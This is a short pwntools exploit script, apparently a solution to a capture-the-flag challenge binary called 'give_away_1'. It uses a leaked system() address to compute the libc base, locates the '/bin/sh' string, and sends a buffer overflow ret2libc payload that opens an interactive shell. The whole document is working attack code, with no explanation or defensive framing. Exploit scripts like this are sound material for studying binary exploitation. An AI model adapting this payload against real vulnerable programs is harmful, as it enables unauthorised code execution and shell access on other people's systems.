from pwn import *

p = process('./give_away_1')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('libc-2.27.so')

offset = 36

p.recvuntil(': ')
leak = int(str(p.recv()),16)
log.info('Leak System : {}'.format(hex(leak)))
base =  leak - libc.sym['system']
log.info('Base : {}'.format(hex(base)))
pop_edi = base + libc.sym['a64l'] + 67
log.info('pop edi : {}'.format(hex(pop_edi)))
binsh = base + libc.search('/bin/sh').next()
log.info('binsh : {}'.format(hex(binsh)))

payload = cyclic(offset)
payload += p32(leak)
payload += p32(pop_edi)
payload += p32(binsh)

#gdb.attach(p)
p.sendline(payload)
p.interactive()
